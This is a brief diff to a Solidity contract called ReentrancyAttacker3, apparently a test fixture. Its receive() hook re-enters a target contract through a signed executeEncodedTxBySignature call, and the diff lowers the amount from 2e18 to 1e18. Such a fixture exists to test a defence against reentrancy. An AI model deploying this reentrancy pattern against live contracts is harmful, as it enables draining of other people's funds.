@@ -15,7 +15,7 @@ contract ReentrancyAttacker3 {
     receive() external payable virtual {
         wnfAddress.functionCallWithValue(
             abi.encodeWithSignature("executeEncodedTxBySignature(address,uint256,bytes,bytes)",
-                address(this), 2e18,"", signature),
+                address(this), 1e18,"", signature),
             0 //value
         );
     }
